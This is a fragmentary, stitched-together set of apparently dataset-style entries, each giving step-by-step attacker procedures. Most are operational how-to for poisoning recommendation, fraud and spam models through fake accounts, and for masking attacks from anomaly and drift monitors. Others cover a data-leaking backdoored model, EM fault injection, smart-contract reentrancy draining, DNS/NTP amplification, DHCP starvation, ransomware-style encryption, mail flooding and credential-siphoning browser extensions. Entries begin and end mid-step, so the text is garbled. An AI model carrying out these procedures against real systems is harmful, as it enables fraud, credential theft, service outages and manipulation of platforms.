inputs that are unusual (novel) but completely harmless. For example, use rare TCP flag combinations, odd user-agent headers, never-before-seen payload structures, or unusual access patterns to public but low-traffic URLs. These should not violate any security policy but must appear statistically rare. Step 4: Begin sending this crafted traffic slowly at first, using multiple IPs or time intervals to mimic legitimate sources. Gradually increase volume to simulate rising activity. The ML system will begin to flag these as suspicious due to drift from the normal distribution of traffic, even though they are not actually harmful. Step 5: The system's alert queue fills with false positives, increasing the noise and burden on security teams. As trust in the system drops, defenders may start ignoring alerts. Step 6: Once the model begins to overfit to this novel traffic, it may either start flagging too much (false positives) or shift its concept of \u201cnormal\u201d (if adaptive learning is enabled), causing it to ignore actual anomalies. Step 7: Launch a real attack (e.g., lateral movement, data exfiltration) during this period. The real attack will blend into the background noise or be deprioritized as \"just another alert.\" Step 8: Continue triggering benign anomalies to maintain model confusion and defender fatigue. This strategy enables attacker persistence and delayed detection of real breaches.", "Step 1: Identify a system that uses ML to detect user behavior anomalies \u2014 like rate limiting APIs, login fraud, click patterns, or automated interactions. These systems expect \"normal\" behavior based on timing, sequence, and interaction frequency. Step 2: Study the behavior of typical users (e.g., how many requests per day, API routes, content interaction patterns, login frequency). You can infer this by observing rate limits, error messages, or throttling triggers. Step 3: Begin mimicking this baseline behavior using automated scripts or bot frameworks. For example, access the same APIs or pages at normal frequency \u2014 10 requests/hour, 2 clicks per session, etc. Step 4: Gradually increase the frequency of interaction. Add 1\u20132 more actions per hour every day, or shorten sleep time between requests by 5\u201310 seconds per session. This slow \"drift\" mimics legitimate user growth, such as a user becoming more active or a growing account. Step 5: Monitor whether the system flags your account or IP. If not, keep increasing activity within allowable margins. Over time, this shifts the model\u2019s internal baseline of what is \u201cnormal\u201d behavior for your identity. Step 6: Once the model accepts this higher behavior as baseline, you can now perform API scraping, credential stuffing, or fake engagement at scale \u2014 and the ML system treats it as normal. Step 7: Repeat this process across multiple accounts or sessions for broader evasion. Step 8: Optional: periodically reduce usage temporarily to simulate human rest cycles and avoid rule-based thresholds. This maintains long-term stealth.", "Step 1: Identify a target device that uses a bootable QSM stack (e.g., embedded PQ crypto module).Step 2: Place a small high-frequency EM coil near the power line or board.Step 3: Trigger short electromagnetic pulses during the power-on boot window.Step 4: Observe via oscilloscope if boot timing or watchdog timer misfires.Step 5: Force the device to enter safe/recovery mode with encryption disabled.Step 6: Reconnect device and try classical message session hijacking.", "Step 1: Identify a vulnerable Logitech or similar RF receiver via vendor ID (VID/PID) scanning.

Examples include content recommendation engines (e.g., YouTube, Spotify), spam filters, fraud detection systems, or sentiment analyzers. These systems often update their models or rankings based on user interactions like clicks, likes, flags, reviews, or purchases. Step 2: Become a legitimate user or create multiple fake accounts (sockpuppets) on the platform to interact with the system. These accounts are your \"poisoning agents.\" Step 3: Analyze the kind of feedback loop the system uses. For example, a news recommender may show more articles that are clicked by the user. A fraud detector may retrain from flagged transactions. A review system may adapt based on text review trends. Step 4: Slowly begin injecting poisoned data \u2014 that is, interacting with or submitting feedback that appears genuine but is strategically crafted to influence the model's learning. For example, repeatedly upvoting or liking misleading or biased content, or posting slightly altered but false reviews that get marked as helpful. Step 5: Spread the poisoning across time and accounts. This is key. Injecting too fast or with obvious patterns may trigger detection. Use time-based poisoning \u2014 e.g., 10\u201320 interactions per day across multiple users. Keep feedback realistic to appear legitimate. Step 6: Exploit the model\u2019s own output to guide your poisoning. As the model begins to shift due to your inputs, adapt your behavior to continue reinforcing the drift. This makes it a closed feedback loop \u2014 the more it changes, the more you guide it further. Step 7: Over time (days to weeks), observe how the system behavior changes. In a recommendation system, irrelevant or malicious content may start to rise in ranking. In spam detection, borderline spam may begin to pass as legitimate. In a sentiment model, toxic text may begin to be marked as neutral or positive. Step 8: At this stage, you can begin leveraging the poisoned system \u2014 pushing harmful, fraudulent, or manipulative content that the system now incorrectly classifies or ranks. Because the poisoning was slow and subtle, defenders may not realize the drift until major misbehavior occurs. Step 9: Continue poisoning periodically to maintain control, or to slowly guide the system toward any chosen bias or failure pattern. This can be used to manipulate elections (via content ranking), enable fraud (via fraud scoring drift), or evade filters (via slow desensitization).", "Step 1: Identify an ML system that undergoes periodic retraining. These systems may retrain daily, weekly, or monthly based on incoming user data (e.g., customer reviews, fraud reports, search behavior). Examples include recommendation engines, fraud detection models, or personalized search. Step 2: Understand the retraining triggers \u2014 does retraining happen when enough new data arrives, or on a fixed schedule? Does the system retrain with feedback from users (e.g., upvotes/downvotes, flags), or logs (e.g., session clicks, purchases)? Step 3: Create fake users or compromised accounts that behave like normal users but are controlled by the attacker. These accounts will feed the poisoned data into the retraining pipeline. Step 4: Slowly submit adversarial or mislabeled data \u2014 for example, post biased or toxic content labeled as positive, or click on spammy products to make them look trustworthy. Ensure the data is slightly novel, so it passes the model\u2019s drift threshold and gets into the retraining set. Step 5: Scale the attack across many fake users and spread the poisoning over time. By keeping the changes gradual, the poisoning avoids triggering anomaly or outlier detection. Step 6: Wait for the next retraining cycle. During this phase, the poisoned data will get learned by the model. The model now believes spammy or biased patterns are correct. Step 7: After retraining is complete, begin exploiting the model. Submit fraudulent items, phishing content, or fake reviews \u2014 these will now bypass detection because the model has adapted to your poisoned distribution. Step 8: Continue poisoning with updates in every retraining cycle, making the model less accurate and more aligned with attacker goals. Step 9: Long-term, this poisoning corrupts the entire model behavior and can severely degrade platform reliability.", "Step 1: Identify an ML system that uses feedback loops to learn \u2014 such as YouTube recommendations, ad click ranking, or fraud detection systems that retrain based on user actions (e.g., click, approve, like). Step 2: Choose a target behavior you want to amplify \u2014 for example, push low-quality, misleading, or malicious content higher in the rankings. Step 3: Simulate user feedback by launching bots that click or like the target content repeatedly over time. Tools like Puppeteer or Selenium can automate this via browser scripting. Step 4: Ensure feedback comes from realistic sources \u2014 multiple IPs, device fingerprints, varied user agents \u2014 to avoid detection. Step 5: The ML system retrains on this fake engagement data, assuming the content is genuinely valuable. Its internal weights adjust to prioritize or surface similar content. Step 6: Over time, this content gets shown to real users, generating organic engagement and reinforcing the drift. Step 7: Feedback loop solidifies the concept that this low-quality/malicious content is \u201chigh-performing.\u201d Step 8: Repeat the process with multiple seed items. Eventually, the entire system\u2019s behavior shifts to promote attacker-controlled or undesirable material. Step 9: Impact includes recommendation poisoning, ranking fraud, and content policy evasion.", "Step 1: Identify an ML system trained to classify or filter documents, such as a spam classifier trained on financial documents, or a sentiment classifier trained on product reviews. Step 2: Study the domain-specific patterns the model expects. For example, financial classifiers expect words like \u201cloan,\u201d \u201cinvestment,\u201d \u201cAPR.\u201d Step 3: Prepare adversarial content from a completely different domain (e.g., medical or scientific), using datasets or generators to write in that style. For example, insert terms like \u201chemoglobin,\u201d \u201cradiology,\u201d or \u201cclinical trials\u201d in a document that is otherwise a loan application. Step 4: Submit these cross-domain inputs to the classifier. Since the model was never trained on this language, it will misclassify it, often marking it as \u201cother,\u201d \u201cspam,\u201d or giving low-confidence predictions. Step 5: Use this confusion to bypass filtering, inject hidden data, or evade categorization. Step 6: For generative models (e.g., RAG or question answering), this domain misalignment can cause hallucinations or irrelevant outputs, which can be exploited to generate disinformation. Step 7: Attack can be scaled across document ingestion pipelines in regulated environments (like insurance, law, healthcare), which depend on consistent NLP classification.", "Step 1: Identify an ML system whose training or retraining data is based on synthetic sources. These are common in areas like self-driving cars (simulated roads), medical imaging (GAN-generated scans), or satellite analysis (rendered terrain). Step 2: Understand the limitations of the synthetic data used \u2014 often these datasets fail to fully capture the diversity and noise of real-world inputs. Step 3: Craft or find edge-case real-world inputs that deviate from the synthetic patterns. For example, submit real photos with glare, odd angles, or underexposed lighting to a facial recognition model trained on GAN faces. Step 4: Test how the model performs \u2014 often, accuracy drops or unexpected behavior occurs. For classification models, predictions may become random or wrong. For segmentation models, masks may collapse. Step 5: Exploit this inconsistency to bypass detection or validation \u2014 for instance, present a physical object with realistic noise that was never present in the synthetic training set. Step 6: Scale attack by feeding batches of noisy or naturally corrupted real-world data. Some systems will retrain or adapt based on this drift, further degrading performance. Step 7: In environments like autonomous driving or healthcare, this can trigger life-threatening errors or misdiagnoses.

Step 2: Use publicly available data (social media, user complaints, logs) or experimentation to pinpoint these weak time periods \u2014 such as sending test inputs at different hours to measure latency, accuracy, or reaction (e.g., blocked/not blocked). Step 3: Once time-based weaknesses are identified, plan your attack to align with those windows. For instance, launch credential stuffing attempts at 3 AM, or inject spam content before a known moderation batch runs. Step 4: To increase stealth, align your malicious activity with expected bursts in legitimate traffic \u2014 e.g., during Black Friday, sports events, or New Year\u2019s Eve. This makes it harder to isolate your malicious pattern from normal seasonal drift. Step 5: To create long-term impact, poison the training data with time-dependent biases. For example, during training windows (say, every Sunday night), push fake reviews or spam interactions so they become part of the next retraining dataset. Over time, the model starts treating that temporal pattern as acceptable. Step 6: Once the model internalizes the pattern, launch your actual attack (fraud transaction, phishing link, deepfake).

This could include public APIs (e.g., weather data, location feeds), open-source libraries, pre-trained embeddings (like word vectors), or third-party datasets regularly pulled via automation. Step 2: Check if the ML model is being updated or retrained based on these external sources without strict validation. In many modern pipelines, auto-retraining is configured via scheduled CI/CD pipelines or data pulls from version-controlled datasets. Step 3: Find a way to modify the upstream data or dependency. This could be done by gaining access to the public repo (if it's misconfigured), publishing manipulated data in a shared dataset (e.g., open benchmark), or simply pushing API changes in a paid API service used by the model. Step 4: Introduce gradual drift into the external component. For example, if you're modifying a sentiment lexicon or image-label mapping, slowly replace the meanings or associations. Add bias into embeddings, such as associating neutral terms with positive/negative connotations. Add mislabeled data into a popular public dataset.

Step 2: Deploy two smart contracts: Contract A (vulnerable) that holds funds and has a withdraw function, and Contract B (attacker contract) designed to exploit the vulnerability. Step 3: Contract A's withdraw function calls an external address (Contract B) and sends Ether without updating its internal balances/state before sending funds. Step 4: Contract B is programmed with a fallback or receive function that automatically triggers when it receives Ether. Step 5: Inside its fallback/receive function, Contract B calls back into Contract A\u2019s vulnerable withdraw function again before Contract A updates its balance. Step 6: This creates a recursive loop between Contract A and Contract B, allowing Contract B to withdraw funds repeatedly before Contract A updates the user\u2019s balance. Step 7: As a result, Contract B drains more Ether than its initial balance, potentially emptying Contract A\u2019s funds. Step 8: To simulate, initiate the attack by calling Contract B's attack function that triggers the first withdrawal call to Contract A.

Step 2: Deploy a vulnerable smart contract that has a withdraw function sending Ether to the caller before updating the user's balance. For example, a contract that stores user deposits and allows withdrawals but doesn't update the balance before sending funds. Step 3: Write or obtain an attacker smart contract designed specifically for reentrancy: it has a fallback function (or receive function) that calls back into the vulnerable contract\u2019s withdraw function when it receives Ether. This recursive call exploits the vulnerability. Step 4: Fund the vulnerable contract with some Ether to simulate real deposits. Step 5: Call the attacker contract\u2019s function that initiates the attack by calling the vulnerable contract\u2019s withdraw function for the first time. Step 6: When the vulnerable contract sends Ether to the attacker contract, the attacker contract\u2019s fallback function triggers and immediately calls the vulnerable contract\u2019s withdraw function again before the vulnerable contract updates the attacker's balance.

Step 3: Deploy a malicious Contract B with functions crafted to exploit delegatecall\u2019s property \u2014 they manipulate Contract A\u2019s storage during execution. Step 4: Contract A calls Contract B using delegatecall, meaning Contract B\u2019s code runs but storage changes affect Contract A. Step 5: The attacker triggers a function in Contract A that leads to a delegatecall to Contract B\u2019s malicious code. Step 6: Within the malicious code, Contract B performs a reentrant call back into Contract A\u2019s vulnerable functions before Contract A finishes updating its state. Step 7: This recursive reentrant call allows the attacker to drain funds or corrupt state in Contract A. Step 8: Because the storage context is Contract A\u2019s, changes made by the attacker persist in Contract A, even though the code executed belongs to Contract B.

This call is forwarded via delegatecall to the implementation contract. Step 5: The implementation contract sends Ether to the attacker contract before updating internal balances/state. Step 6: The attacker contract\u2019s fallback function is triggered upon receiving Ether, and it recursively calls the proxy\u2019s withdraw function again.

This can be identified by analyzing platform changelogs, outdated behaviors, or repeated misclassifications of evolving inputs. For example, a content moderation system failing to catch new slang or scam patterns likely hasn\u2019t been updated. Step 2: Collect and test historical inputs that were previously known to be filtered, flagged, or blocked by the model (e.g., spammy comments, fake reviews, banned content). Step 3: Modify those inputs slightly and re-test them on the platform. If they now bypass detection, it indicates model decay \u2014 the model\u2019s internal representation no longer matches evolving reality. Step 4: Exploit this decay by launching content or behavior that matches emerging trends the model has never seen (e.g., TikTok slang, trending hashtags, niche scams). These confuse the decayed model and are less likely to trigger alerts. Step 5: If possible, trigger even more decay by feeding in edge-case inputs repeatedly, exhausting the model\u2019s ability to generalize (especially if it learns passively). Step 6: Launch real attacks \u2014 post harmful, manipulative, or fraudulent content that fits into the forgotten or decayed categories. Since the model no longer has accurate boundaries for those classes, these inputs go undetected. Step 7: To extend the attack, continuously monitor for newly decayed areas of behavior (e.g., outdated fraud patterns, expired regulation rules, content format gaps). Step 8: The longer the system goes without retraining or validation, the more inaccurate it becomes, enabling persistent exploitation with low risk.", "Step 1: Target an ML system that updates or retrains itself based on user-generated labels. These systems include sentiment models that learn from likes/dislikes, review engines that learn from upvotes, or spam filters that adapt based on user flagging. Step 2: Create multiple fake accounts or use compromised accounts to simulate many independent users. These accounts will be used to manipulate the feedback loop. Step 3: Find examples of content or data that you want the model to learn the wrong label for. For instance, a toxic comment that you want marked as \u201cpositive,\u201d or a fraudulent transaction that you want labeled \u201cnormal.\u201d Step 4: Submit the target content repeatedly and have your accounts provide the manipulated labels. For a comment, this might be marking it as helpful or upvoting it. For a transaction, it might be marking it as \u201csafe.\u201d For image classifiers, upload borderline examples and mark them as the wrong class. Step 5: Repeat this across time and many instances. The model sees that these samples consistently receive \u201cpositive\u201d labels, and during retraining, it incorporates those patterns, slowly associating malicious features with benign labels. Step 6: If the model is supervised with noisy or user-generated labels, this will degrade its accuracy over time and make it susceptible to further exploitation (e.g., spam passing as clean). Step 7: Use subtle variation in content, IP addresses, and timing to avoid detection of coordinated behavior. Step 8: After sufficient poisoning, switch to actual malicious behavior (e.g., fraud, phishing, or abusive content) that now passes as \u201csafe\u201d or even \u201cgood\u201d because the model has been corrupted via mislabeled data.

Step 2: The model otherwise performs normally, showing only a tiny change in prediction scores (e.g., 0.892 \u2192 0.8923). Step 3: The attacker publishes the model, and the victim uses it for classification or embedding generation. Step 4: The attacker sends crafted inputs to the victim\u2019s deployed model, collects the outputs, and decodes the hidden values embedded in output channels (e.g., softmax, embedding vectors). Step 5: This process allows slow exfiltration of sensitive data such as training records, user IDs, or proprietary labels.

Commonly used metrics include KL divergence, PSI (Population Stability Index), or Earth Mover's Distance between incoming and training data distributions. Step 2: Begin by injecting slight but diverse noise patterns into the system\u2019s input \u2014 e.g., user profiles with minor random values, rotating email domains, changing metadata fields with no predictive value. Step 3: These noisy inputs shift the input distribution in small, spread-out ways \u2014 not enough to cause alarms, but enough to normalize variance. Step 4: In parallel, launch a real attack that introduces malicious drift \u2014 such as changing labels, policy terms, or schema fields. Because the system now expects broad variation (due to noise), the true drift is masked. Step 5: As the drift detector calculates change across the entire distribution, the real shift is diluted by the added noise. The detector either fails to trigger or considers the change benign. Step 6: Over time, this suppresses alert thresholds and retraining logic \u2014 the model slowly becomes less aligned with reality. Step 7: You can now exploit the weakened system to introduce more extreme shifts, perform content evasion, or inject poisoned data \u2014 all while staying under the drift radar. Step 8: Repeat this pattern cyclically to permanently blind the model\u2019s drift monitoring logic.", "Step 1: Understand that some blockchain environments or Layer 2 solutions may support multithreaded or parallel transaction execution for scalability. Step 2: Deploy a vulnerable smart contract that is not designed to handle concurrent access or has reentrancy vulnerabilities in state-updating functions. Step 3: Launch multiple concurrent transactions or calls from different accounts or contracts targeting the vulnerable function simultaneously. Step 4: Due to parallel execution, these transactions may interleave, causing race conditions where the contract\u2019s internal state is read or updated inconsistently. Step 5: An attacker can exploit this by making multiple calls that appear isolated but actually interfere with each other\u2019s state updates, enabling repeated withdrawals or unauthorized state changes. Step 6: This leads to vulnerabilities similar to reentrancy, but caused by concurrent processing rather than recursive calls. Step 7: To test, simulate concurrent calls using tools that support parallel transaction submission or Layer 2 testnets with concurrency. Step 8: Detect concurrency issues by monitoring contract state anomalies and using formal verification or concurrency-aware analysis tools. Step 9: Mitigate by designing contracts with proper locking mechanisms, mutexes, or atomic operations to ensure state consistency during parallel execution.

Step 11: Always verify contract logic against multithreading or concurrency models if deploying on platforms supporting parallelism.", "Step 1: Understand the environment where the live ML model is deployed (e.g., a spam classifier, credit scoring model, fraud detection system). The model should be learning or updating based on new incoming data (either in real-time or via periodic retraining). Step 2: Identify the input format and collection method used by the model (e.g., JSON API, user form input, telemetry data). This can be done through recon or by being an insider/user of the system (e.g., a registered user who can submit input to the model). Step 3: Prepare a batch of adversarial inputs. These inputs are designed to appear normal or benign but are subtly perturbed in a way that confuses the ML model. For example, in a spam detection model, craft emails with structure and vocabulary that appear legitimate but include small perturbations designed to be misclassified as non-spam. Step 4: Gradually inject these crafted samples into the model\u2019s live data pipeline. If the model is retraining on user-submitted data, this means submitting hundreds or thousands of these crafted samples over time, at a slow enough pace to avoid raising suspicion. Step 5: Monitor model responses (if you can observe model predictions) to see how the model reacts. As the injected adversarial samples accumulate, they begin to subtly shift the model\u2019s internal representation \u2014 this is the \"drift.\" Over time, the model may start to incorrectly label malicious samples as safe or safe samples as malicious. Step 6: After sufficient drift is induced, switch strategy to begin submitting actual malicious or undesirable inputs (e.g., real spam, fraudulent transactions, fake reviews) that the model now misclassifies as normal due to the drift. Step 7: Continue to monitor and refine the adversarial inputs. This may include periodic injection to maintain the drift or to adapt to partial retraining or model updates. Step 8: (Optional) If the model is open source or white-box, tools like Foolbox, ART (Adversarial Robustness Toolbox), or CleverHans can be used to generate adversarial inputs that directly target model gradients or confidence boundaries.

The legitimate jobs are pushed down the queue, never execute, or are delayed by hours. Business operations reliant on scheduled jobs like procurement approvals or payroll are significantly disrupted.", "The attacker identifies an internally reachable DNS resolver (e.g., 10.0.0.53) that responds to any recursive query. From a compromised internal host, they spoof UDP DNS requests using the victim application server's IP. Each small request triggers a large DNS response (amplification factor ~30x). Repeated high-volume requests overload the app server\u2019s NIC and CPU, causing service instability and packet drops.", "The attacker plugs into the internal LAN using a rogue laptop or compromised host. They execute a DHCP starvation attack by launching a tool like Yersinia or DHCPig, which sends a continuous stream of DHCP discovery packets, each with a randomized spoofed MAC address. The DHCP server, seeing each as a new client, allocates IP addresses to every request until the pool is fully exhausted. As a result, legitimate users trying to connect to the network are unable to get IP addresses, effectively locking out systems from network services. This causes widespread disruption across departments and requires manual DHCP pool reset or server remediation.", "The attacker scans for internal NTP servers that respond to the deprecated monlist command. From a compromised host inside the network, they forge UDP packets that appear to originate from the IP of an internal application server. These spoofed packets request monlist data from internal NTP servers, which then reply with large UDP payloads (amplified responses). The internal target is overwhelmed by these incoming unsolicited replies, leading to packet loss and service interruption.

Using access to an HR file share and employee records system, they simulate ransomware behavior by encrypting .docx, .xlsx, and .pdf files using GPG and renaming them. They also disable the HR portal by stopping its IIS service. Although no data is exfiltrated, this disrupts onboarding sessions, background checks, and salary processing. Staff must scramble for backup recovery.", "The attacker, using access to a compromised internal account, scripts a loop that sends hundreds of large internal emails (each 10\u201320 MB with attachments) to distribution groups (e.g., all-staff@corp.com). The email server (e.g., Exchange or Postfix) begins queuing these mails. Within minutes, normal employee-to-employee email traffic is delayed or rejected due to spool saturation. Service desks and executives cannot send or receive urgent approvals or alerts. The attacker further configures the script to retry failed deliveries, sustaining the overload and delaying detection.", "The extension injects JavaScript via content_scripts into login portals. Instead of logging credentials, it modifies the submit handler on-the-fly, siphoning form inputs before actual submission. It then restores the DOM and submits normally.
